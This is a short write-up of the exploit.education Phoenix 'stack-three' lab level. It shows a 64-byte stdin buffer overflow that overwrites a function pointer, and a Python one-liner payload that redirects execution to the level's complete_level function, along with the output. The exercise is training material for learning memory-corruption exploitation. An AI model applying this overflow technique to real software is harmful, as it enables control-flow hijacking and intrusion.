Write-up for: [Stack Three](https://exploit.education/phoenix/stack-three/)

<!--more-->

This is again very similar, but this time we are overwriting a function pointer via
stdin.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ ./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer @ 0x41414141
Segmentation fault
```

The buffer is again 64 bytes large. Thus we can precisely target the function pointer value.
Where do we want to jump instead? Looking at the symbols we can see a function called `complete_level`:

```bash
objdump -t stack-three
08048535 g     F .text  00000020 complete_level
```

Since we have no memory protection, let's just jump there

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "A"*64 + "\x08\x04\x85\x35"[::-1]' | ./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x8048535
Congratulations, you've finished phoenix/stack-three :-) Well done!ongratulations, you've finished phoenix/stack-three :-) Well done!

Don't forget the little endianness ;)
